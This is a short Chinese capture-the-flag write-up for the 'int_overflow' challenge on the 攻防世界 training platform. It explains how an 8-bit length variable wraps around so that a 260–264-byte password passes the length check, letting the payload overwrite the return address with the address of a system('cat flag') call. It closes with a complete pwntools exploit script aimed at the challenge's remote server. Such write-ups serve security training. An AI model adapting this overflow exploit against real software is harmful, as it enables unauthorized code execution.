# 攻防世界 int_overflow

## 分析：

int overflow 整型溢出，就是整数在超出数值范围时会将超出范围的部分省去，保留剩下的部分

这一题中，保存字符串长度的变量v3是8位无符号整数变量，最大值为255，而可以输入的长度为0x199，远大于255，而检查字符串长度时是检查v3的值在4-8之间，同时在程序中有``system("cat flag")``函数，因此只需要保证字符串长度在260-264之间，并将返回地址覆盖为``system("cat flag")``的地址即可

## exp:

```python
from pwn import *

#n = process('./int_overflow')
n = remote('111.198.29.45',59540)

elf = ELF('./int_overflow')

n.recvuntil('choice:')
n.sendline('1')
n.recvuntil('username:\n')
n.sendline('1')
n.recvuntil('passwd:\n')
payload = 'a' * 0x18 + p32(0x0804868B)
payload += 'a' * (260 - len(payload))
n.sendline(payload)
print(n.recvall())
```

